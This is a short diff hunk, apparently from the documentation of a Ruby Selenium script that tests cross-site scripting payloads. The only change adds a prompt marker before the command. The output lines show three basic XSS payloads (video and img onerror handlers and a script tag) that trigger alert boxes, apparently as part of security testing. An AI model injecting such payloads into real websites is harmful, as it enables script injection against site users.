@@ -137,7 +137,7 @@ end
 
 Result
 ```
-ruby selenium-xss.rb
+> ruby selenium-xss.rb
 Payload is working: <video src=x onerror=alert(1);>
 Payload is working: <img src=x onerror='alert(2)'>
 Payload is working: <script>alert(3)</script>
